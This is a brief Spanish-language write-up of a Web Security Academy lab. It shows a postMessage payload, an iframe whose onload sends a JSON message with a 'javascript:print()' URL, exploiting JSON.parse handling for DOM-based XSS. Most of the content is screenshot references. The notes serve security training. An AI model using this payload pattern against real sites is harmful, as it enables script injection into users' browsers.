![[Pasted image 20220807193106.png]]


Desplegando el codigo fuente de la pagina:

![[Pasted image 20220807193700.png]]

en el exploit server ponemos el siguiente payload:

![[Pasted image 20220807193826.png]]


en esencia el payload:
"iframe src=https://0a98000e03445314c03d03fe00f50012.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'"

explota el json.parse para mostrar el mensaje:

![[Pasted image 20220807193945.png]]

![[Pasted image 20220807194021.png]]